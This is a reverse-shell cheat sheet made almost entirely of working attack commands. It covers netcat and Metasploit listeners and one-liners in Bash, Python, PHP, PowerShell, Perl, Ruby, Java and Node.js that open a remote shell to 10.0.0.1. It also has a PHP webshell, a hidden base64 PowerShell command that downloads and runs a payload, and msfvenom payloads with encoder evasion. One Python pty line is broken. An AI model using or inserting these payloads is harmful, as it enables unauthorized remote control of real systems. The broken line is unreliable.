# Reverse Shell Cheat Sheet

## Listener Commands
```bash
# Netcat basic
nc -lvnp 4444

# Netcat with SSL
ncat -lvnp 4444 --ssl

# Socat
socat TCP-L:4444 -

# Metasploit
msfconsole -q
use exploit/multi/handler
set PAYLOAD linux/x64/meterpreter/reverse_tcp
set LHOST tun0
set LPORT 4444
exploit

# Python listener
python3 -c "import socket;s=socket.socket();s.bind(('0.0.0.0',4444));s.listen(1);c,a=s.accept();c.send(b'id\n');print(c.recv(1024).decode())"
```

## Bash
```bash
# Basic
bash -i >& /dev/tcp/10.0.0.1/4444 0>&1

# With exec
exec 5<>/dev/tcp/10.0.0.1/4444;cat <&5|while read line;do $line 2>&5 >&5;done

# Short
bash -c "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"

# Read-only alternative
0<&196;exec 196<>/dev/tcp/10.0.0.1/4444; sh <&196 >&196 2>&196
```

## Python
```python
# Python 3
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Python 3 shorter
python3 -c 'import socket,subprocess;s=socket.socket();s.connect(("10.0.0.1",4444));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'

# Python 2
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Python with pty
python3 -c 'import pty,pty.spawn(["/bin/bash"])'
```

## PHP
```php
# PHP one-liner
php -r '$s=fsockopen("10.0.0.1",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

# PHP with shell_exec
php -r '$s=fsockopen("10.0.0.1",4444);shell_exec("/bin/sh -i <&3 >&3 2>&3");'

# PHP file (webshell)
<?php system($_GET['cmd']); ?>
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'"); ?>
```

## Netcat
```bash
# Linux netcat
nc -e /bin/sh 10.0.0.1 4444

# Netcat with -c (some versions)
nc -c /bin/sh 10.0.0.1 4444

# Netcat on Windows
nc.exe -e cmd.exe 10.0.0.1 4444

# Without -e (pipe method)
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4444 >/tmp/f

# With busybox
busybox nc 10.0.0.1 4444 -e /bin/sh
```

## PowerShell (Windows)
```powershell
# PowerShell reverse shell (base64 encoded)
powershell -NoP -NonI -W Hidden -Exec Bypass -Enc SQBFAFAAPAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMAAuADAALgAxAC8AcABhAHkAbABvAGEAZAAnACkA

# PowerShell TCP client
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$c=New-Object System.Net.Sockets.TCPClient('10.0.0.1',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1 | Out-String );$sb2=$sb + 'PS ' + (pwd).Path + '> ';$sbt=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$c.Close()"

# Base64 encoded PowerShell shell
$Text = '$client = New-Object System.Net.Sockets.TCPClient("10.0.0.1",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
$Encoded = [Convert]::ToBase64String($Bytes)
powershell -EncodedCommand $Encoded
```

## Other Languages
```bash
# Perl
perl -e 'use Socket;$i="10.0.0.1";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

# Ruby
ruby -rsocket -e 'c=TCPSocket.new("10.0.0.1",4444);$stdin.reopen(c);$stdout.reopen(c);$stderr.reopen(c);$stdin.each_line{|l|l.chomp;system(l)};'

# Java
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/4444;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])

# Node.js
require('child_process').exec('bash -i >& /dev/tcp/10.0.0.1/4444 0>&1')

# Telnet
telnet 10.0.0.1 4444 | /bin/bash | telnet 10.0.0.1 4444
# On listener: socat file:`tty`,raw,echo=0 TCP-L:4444
```

## msfvenom Payloads
```bash
# Linux
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf -o shell.elf
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf -o m.elf

# Windows
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe -o shell.exe
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe -o m.exe
msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f asp -o shell.asp
msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f aspx -o shell.aspx

# Web
msfvenom -p php/reverse_php LHOST=10.0.0.1 LPORT=4444 -f raw -o shell.php
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f raw -o shell.jsp
msfvenom -p python/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f raw -o shell.py

# Script payloads
msfvenom -p cmd/unix/reverse_bash LHOST=10.0.0.1 LPORT=4444 -f raw
msfvenom -p cmd/windows/powershell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f raw

# Staged vs Stageless
# Staged:     shell/reverse_tcp     (upload stager -> download stage)
# Stageless:  shell_reverse_tcp     (full payload included)

# Encoding/Evasion
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -e x64/xor -i 5 -f exe -o encoded.exe
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -e x86/shikata_ga_nai -i 10 -f elf -o encoded.elf

# Listeners
nc -lvnp 4444                                  # For shell payloads
use exploit/multi/handler                       # For meterpreter
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST tun0; set LPORT 4444; exploit
```

## Upgrade Shells
```bash
# Python PTY
python3 -c 'import pty;pty.spawn("/bin/bash")'

# PTY with stty
python3 -c 'import pty;pty.spawn("/bin/bash")'
Ctrl+Z  # Background
stty raw -echo; fg
reset; export TERM=xterm; stty rows 40 cols 120

# Socat full TTY
# Listener: socat file:`tty`,raw,echo=0 TCP-L:4444
# Target:   socat exec:'bash -li',pty,stderr,setsid,sigint,sane TCP:10.0.0.1:4444
```
